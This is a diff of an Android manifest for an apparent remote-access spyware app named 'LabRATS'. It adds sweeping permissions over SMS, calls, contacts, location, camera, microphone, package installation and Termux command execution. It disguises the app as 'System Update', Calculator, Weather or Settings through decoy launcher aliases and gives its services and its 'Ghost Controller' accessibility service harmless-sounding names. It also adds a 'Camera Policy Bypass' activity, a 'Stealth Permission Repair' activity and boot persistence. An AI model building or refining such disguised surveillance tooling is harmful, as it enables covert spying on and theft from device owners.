@@ -2,74 +2,70 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- Network Permissions -->
+    <!-- Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
-
-    <!-- Storage Permissions -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" 
-        android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" 
-        android:maxSdkVersion="29"
-        tools:ignore="ScopedStorage" />
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
-        tools:ignore="ScopedStorage" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="29" tools:ignore="ScopedStorage" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-
-    <!-- Call Logs & Contacts -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
-
-    <!-- Location Permissions -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
-
-    <!-- SMS Permissions -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.WRITE_SMS" />
-
-    <!-- Phone State for Device Info -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-feature android:name="android.hardware.telephony" android:required="false" />
-
-    <!-- Camera -->
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
     <uses-permission android:name="android.permission.CAMERA" />
-    <uses-feature android:name="android.hardware.camera" android:required="false" />
-    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
-
-    <!-- Audio for Video Recording and Call Recording -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    
-    <!-- Phone Call Detection & Execution -->
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
-
-    <!-- Overlay Permission for Background Camera -->
+    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
+    <uses-permission android:name="android.permission.READ_CALENDAR" />
+    <uses-permission android:name="android.permission.WRITE_CALENDAR" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.BLUETOOTH" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+    <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-
-    <!-- Foreground Service -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-
-    <!-- Keep Running -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="com.termux.permission.RUN_COMMAND" />
+
+    <uses-feature android:name="android.hardware.telephony" android:required="false" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
 
     <application
-        android:allowBackup="true"
+        android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
@@ -78,6 +74,7 @@
         android:requestLegacyExternalStorage="true"
         android:usesCleartextTraffic="true"
         android:stopWithTask="false"
+        android:autoRevokePermissions="disallowed"
         tools:targetApi="34">
 
         <!-- Android 16 Compatibility: Allow orientation/aspect ratio control on large screens -->
@@ -86,23 +83,39 @@
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:launchMode="singleTask"
+            android:launchMode="singleInstance"
+            android:noHistory="true"
             android:excludeFromRecents="true"
             android:theme="@style/Theme.LabRATS">
         </activity>
+
+        <!-- Camera Policy Bypass Activity -->
+        <activity
+            android:name=".CameraHelper$BypassActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:exported="false" />
+
+        <!-- Stealth Permission Repair Activity -->
+        <activity
+            android:name=".PermissionActivity"
+            android:theme="@style/Theme.LabRATS.Permissions"
+            android:excludeFromRecents="true"
+            android:exported="false" />
 
         <activity
             android:name=".DecoyActivity"
             android:exported="false"
             android:excludeFromRecents="true"
             android:label="System Update"
-            android:icon="@drawable/ic_sprocket_gear"
+            android:icon="@drawable/ic_analytics_data"
             android:theme="@style/Theme.LabRATS.Decoy">
         </activity>
 
         <activity-alias
             android:name=".LauncherAlias"
-            android:enabled="true"
+            android:enabled="false"
             android:exported="true"
             android:label="@string/app_name"
             android:icon="@mipmap/ic_launcher"
@@ -115,10 +128,11 @@
 
         <activity-alias
             android:name=".SystemUpdateAlias"
-            android:enabled="false"
+            android:enabled="true"
             android:exported="true"
             android:label="System Update"
-            android:icon="@drawable/ic_sprocket_gear"
+            android:icon="@mipmap/ic_system_update_adaptive"
+            android:roundIcon="@mipmap/ic_system_update_round"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -132,6 +146,7 @@
             android:exported="true"
             android:label="Calculator"
             android:icon="@mipmap/ic_calculator_adaptive"
+            android:roundIcon="@mipmap/ic_calculator_adaptive"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -144,7 +159,8 @@
             android:enabled="false"
             android:exported="true"
             android:label="Weather"
-            android:icon="@drawable/weather_icon"
+            android:icon="@mipmap/ic_weather_adaptive"
+            android:roundIcon="@mipmap/ic_weather_adaptive"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -157,8 +173,8 @@
             android:enabled="false"
             android:exported="true"
             android:label="Settings"
-            android:icon="@drawable/ic_settings_decoy"
-            android:roundIcon="@drawable/ic_settings_decoy"
+            android:icon="@mipmap/ic_settings_adaptive"
+            android:roundIcon="@mipmap/ic_settings_round"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -166,33 +182,62 @@
             </intent-filter>
         </activity-alias>
 
-        <service
-            android:name=".CoreSyncService"
-            android:enabled="true"
-            android:exported="false"
-            android:stopWithTask="false"
-            android:foregroundServiceType="camera|microphone|dataSync|location" />
+        <activity-alias
+            android:name=".LabRatsLogoAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Lab-RATS"
+            android:icon="@mipmap/ic_labrats_logo_adaptive"
+            android:roundIcon="@mipmap/ic_labrats_logo_round"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
 
         <service
-            android:name=".MediaContainer"
+            android:name=".WorkManager_Sync"
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
+            android:foregroundServiceType="dataSync|location|specialUse">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="System Stability and Background Data Synchronization" />
+        </service>
+
+        <service
+            android:name=".Analytics_Provider"
+            android:enabled="true"
+            android:exported="false"
+            android:label="Device Bridge"
+            android:stopWithTask="false"
             android:foregroundServiceType="camera|microphone|dataSync" />
+
+        <!-- Installation Trigger -->
+        <receiver android:name=".InstallReferrerReceiver"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="com.android.vending.INSTALL_REFERRER" />
+            </intent-filter>
+        </receiver>
 
         <receiver
             android:name=".SystemBoot"
             android:enabled="true"
-            android:exported="true">
-            <intent-filter>
+            android:exported="true"
+            android:label="SysHealthCheck">
+            <intent-filter android:priority="999">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="com.labs.jaeto.U80MN6S0UYXZ" />
+                <action android:name="com.labs.jaeto.81LQ675PIDL6" />
             </intent-filter>
         </receiver>
 
         <!-- Call Record Service for audio capture -->
         <service
-            android:name=".AudioStability"
+            android:name=".MediaFrameworkService"
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
@@ -224,10 +269,11 @@
 
         <!-- Ghost Controller (Accessibility Service) -->
         <service
-            android:name=".AccessibilityCore"
+            android:name=".IO_Persistence_Manager"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true"
-            android:directBootAware="true"
+            android:label="@string/app_name"
+            android:description="@string/accessibility_description"
             android:stopWithTask="false">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -246,6 +292,9 @@
                 android:name="android.support.FILE_PROVIDER_PATHS"
                 android:resource="@xml/file_paths" />
         </provider>
+        <meta-data
+            android:name="preloaded_fonts"
+            android:resource="@array/preloaded_fonts" />
 
     </application>
 
